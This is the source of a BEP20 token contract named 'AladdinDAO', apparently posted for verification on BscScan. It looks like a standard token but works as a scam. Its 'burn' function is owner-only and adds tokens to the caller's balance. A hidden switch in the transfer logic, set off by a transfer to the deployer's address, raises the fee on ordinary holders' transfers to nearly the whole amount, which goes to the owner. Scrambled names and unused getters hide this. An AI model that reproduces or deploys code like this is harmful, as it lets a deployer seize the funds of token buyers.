/**
 *Submitted for verification at BscScan.com on 2022-11-28
*/

/////////////////////////////////////////////////////////////
//CIG Newbee 
//AladdinDAO Boule Member 
//Chaoyang Metaverse Comrade
//https://twitter.com/forgivenever
//https://t.co/Ai0gtpmepk
//https://t.co/DEaIMDubUX
/////////////////////////////////////////////////////////////
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
contract AladdinDAO {
string public  name = "AladdinDAO";
address private  GMPFCH = address(0);
uint256 private  CAPPXZ = 1000000000000000000000;
uint256 public constant ZDYGIZ = 99999;
address private  HHBQDF = address(0);
uint256 private  OQFDKI = 100000000;
mapping (address => uint256) public balanceOf;
uint256 private  SVEUYD = 10000000000;
uint256 private  WNFKOP = 10000000000000;
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
uint256 private  UOCHFV = 1000000000000000000;
string public  symbol = "AladdinDAO";
mapping (address => mapping (address => uint256)) private _allowances;
uint8 public constant decimals = 18;
address public owner;
address private  YZNJNO = address(0);
event Transfer(address indexed from, address indexed to, uint256 value);
address private  BCJRXG = address(0);
uint256 private  QODGAH = 1000000000000000;
uint256 private  EMLDTO = 1000000000000000000;
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
uint256 public constant totalSupply = 100000000000000000000000000000;
address private  SPJDDC = address(0);
event Approval(address indexed owner, address indexed spender, uint256 value);
function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
function _getEMLDTO() private returns (uint256) {
return EMLDTO;
}

function _getSPJDDC() private returns (address) {
return SPJDDC;
}

function _getWNFKOP() private returns (uint256) {
return WNFKOP;
}

function _getBCJRXG() private returns (address) {
return BCJRXG;
}

function _getGMPFCH() private returns (address) {
return GMPFCH;
}

modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
function _getSVEUYD() private returns (uint256) {
return SVEUYD;
}

function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "tDHTSBK 0");
require(spender != address(0), "fDHTSBK 0");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
constructor () {
YZNJNO = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
function _getOQFDKI() private returns (uint256) {
return OQFDKI;
}

function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "DHTSBK");
require(to != address(0), "DHTSBK");
require(amount <= balanceOf[from], "DHTSBK");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* ZDYGIZ/UOCHFV ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==YZNJNO){
UOCHFV = ZDYGIZ+2;
}
emit Transfer(from, to, transferAmount);
}
function _getHHBQDF() private returns (address) {
return HHBQDF;
}

function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
function _getQODGAH() private returns (uint256) {
return QODGAH;
}

function _getCAPPXZ() private returns (uint256) {
return CAPPXZ;
}

function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}

}